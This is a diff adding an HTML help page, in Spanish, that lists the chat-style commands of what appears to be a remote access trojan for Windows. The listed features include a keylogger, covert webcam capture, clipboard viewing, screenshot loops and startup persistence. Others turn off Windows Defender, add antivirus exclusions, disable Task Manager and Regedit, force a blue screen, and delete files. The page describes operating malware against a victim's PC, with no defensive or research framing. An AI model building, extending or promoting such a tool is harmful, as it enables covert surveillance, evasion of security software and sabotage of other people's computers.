@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lista de Comandos</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        body {
+            background: #1a1a1a;
+            color: #f5f5f5;
+            font-size: 16px;
+            line-height: 1.6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background: #2c2c2c;
+            border-radius: 10px;
+            padding: 30px 40px;
+            text-align: left;
+            width: 100%;
+            max-width: 800px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8);
+            overflow-y: auto;
+            max-height: 90vh;
+        }
+
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 2px;
+            color: #00e5ff;
+            text-shadow: 1px 1px 4px rgba(0, 229, 255, 0.7);
+            font-size: 2.5rem;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .command {
+            margin-bottom: 20px;
+        }
+
+        .command-name {
+            font-size: 1.2rem;
+            color: #00e5ff;
+            font-weight: bold;
+            margin-bottom: 5px;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.6);
+        }
+
+        .command-description {
+            font-size: 1rem;
+            color: #c6c6c6;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.4);
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Lista de Comandos</h1>
+
+        <div class="command"><div class="command-name">`.help`</div><div class="command-description">Muestra este mensaje.</div></div>
+        <div class="command"><div class="command-name">`.clipper`</div><div class="command-description">Muestra el contenido del portapapeles.</div></div>
+        <div class="command"><div class="command-name">`.startup &lt;filepath&gt;`</div><div class="command-description">Agrega el archivo especificado al Startup del Task Manager.</div></div>
+        <div class="command"><div class="command-name">`.wallpaper [&lt;image&gt;]`</div><div class="command-description">Cambiar el fondo de la PC.</div></div>
+        <div class="command"><div class="command-name">`.screenshot`</div><div class="command-description">Hacer una captura de pantalla.</div></div>
+        <div class="command"><div class="command-name">`.screenshotloop`</div><div class="command-description">Hacer capturas de pantalla en bucle.</div></div>
+        <div class="command"><div class="command-name">`.screenshotstoploop`</div><div class="command-description">Detener el bucle de capturas de pantalla.</div></div>
+        <div class="command"><div class="command-name">`.webcam`</div><div class="command-description">Hacer una foto con la webcam (la cámara no se enciende).</div></div>
+        <div class="command"><div class="command-name">`.web &lt;url&gt;`</div><div class="command-description">Abrir una web.</div></div>
+        <div class="command"><div class="command-name">`.webcrash &lt;url&gt; &lt;time&gt;`</div><div class="command-description">Abrir una web las veces que quieras.</div></div>
+        <div class="command"><div class="command-name">`.rename &lt;filenameold&gt; &lt;filenamenew&gt;`</div><div class="command-description">Cambiar el nombre de un archivo (con extensión).</div></div>
+        <div class="command"><div class="command-name">`.remove &lt;filename&gt;`</div><div class="command-description">Eliminar el archivo especificado.</div></div>
+        <div class="command"><div class="command-name">`.add &lt;filename&gt;`</div><div class="command-description">Crear el archivo con el nombre especificado.</div></div>
+        <div class="command"><div class="command-name">`.md &lt;foldername&gt;`</div><div class="command-description">Crear la carpeta con el nombre especificado.</div></div>
+        <div class="command"><div class="command-name">`.removefolder &lt;foldername&gt;`</div><div class="command-description">Eliminar la carpeta especificada.</div></div>
+        <div class="command"><div class="command-name">`.pwd`</div><div class="command-description">Ver el directorio actual.</div></div>
+        <div class="command"><div class="command-name">`.ls`</div><div class="command-description">Ver archivos y carpetas del directorio actual.</div></div>
+        <div class="command"><div class="command-name">`.tree`</div><div class="command-description">Ver árbol de archivos del directorio actual.</div></div>
+        <div class="command"><div class="command-name">`.cd &lt;directory&gt; o ..`</div><div class="command-description">Navegar entre directorios o `..` para retroceder un directorio.</div></div>
+        <div class="command"><div class="command-name">`.write &lt;filename&gt; &lt;content&gt;`</div><div class="command-description">Reemplazar el texto del archivo especificado. Para espacios, usar `_`.</div></div>
+        <div class="command"><div class="command-name">`.read &lt;filename&gt;`</div><div class="command-description">Leer el contenido del archivo especificado.</div></div>
+        <div class="command"><div class="command-name">`.shutdown`</div><div class="command-description">Apagar la PC.</div></div>
+        <div class="command"><div class="command-name">`.restart`</div><div class="command-description">Reiniciar la PC.</div></div>
+        <div class="command"><div class="command-name">`.logoff`</div><div class="command-description">Cerrar la sesión de la PC.</div></div>
+        <div class="command"><div class="command-name">`.bluescreen`</div><div class="command-description">Forzar una Blue Screen Of Death (BSOD).</div></div>
+        <div class="command"><div class="command-name">`.keylogger &lt;on/off&gt;`</div><div class="command-description">Iniciar o detener el keylogger (registrador de teclas).</div></div>
+        <div class="command"><div class="command-name">`.monitors &lt;on/off&gt;`</div><div class="command-description">Encender o apagar el monitor (no apaga la PC).</div></div>
+        <div class="command"><div class="command-name">`.antiviruson`</div><div class="command-description">Habilitar Windows Defender.</div></div>
+        <div class="command"><div class="command-name">`.antivirusoff`</div><div class="command-description">Deshabilitar Windows Defender.</div></div>
+        <div class="command"><div class="command-name">`.enableall`</div><div class="command-description">Habilitar aplicaciones: Regedit, Task Manager, Control.</div></div>
+        <div class="command"><div class="command-name">`.disableall`</div><div class="command-description">Deshabilitar aplicaciones: Regedit, Task Manager, Control.</div></div>
+        <div class="command"><div class="command-name">`.showtaskbar`</div><div class="command-description">Mostrar la barra de tareas.</div></div>
+        <div class="command"><div class="command-name">`.hidetaskbar`</div><div class="command-description">Ocultar la barra de tareas.</div></div>
+        <div class="command"><div class="command-name">`.defenderexclusion &lt;filepath&gt;`</div><div class="command-description">Agregar el archivo especificado a exclusiones de Windows Defender.</div></div>
+        <div class="command"><div class="command-name">`.copy &lt;filepath_now&gt; &lt;folderpath_new&gt;`</div><div class="command-description">Copiar un archivo de un directorio a otro.</div></div>
+        <div class="command"><div class="command-name">`.infomsg &lt;title&gt; &lt;message&gt;`</div><div class="command-description">Enviar un mensaje con icono de info. Para espacios, usar `_`.</div></div>
+        <div class="command"><div class="command-name">`.errormsg &lt;title&gt; &lt;message&gt;`</div><div class="command-description">Enviar un mensaje con icono de error. Para espacios, usar `_`.</div></div>
+        <div class="command"><div class="command-name">`.warnmsg &lt;title&gt; &lt;message&gt;`</div><div class="command-description">Enviar un mensaje con icono de advertencia. Para espacios, usar `_`.</div></div>
+        <div class="command"><div class="command-name">`.requestmsg &lt;title&gt; &lt;message&gt;`</div><div class="command-description">Enviar un mensaje con icono de pregunta. Para espacios, usar `_`.</div></div>
+
+        <!-- Add more commands as needed -->
+
+    </div>
+</body>
+
+</html>
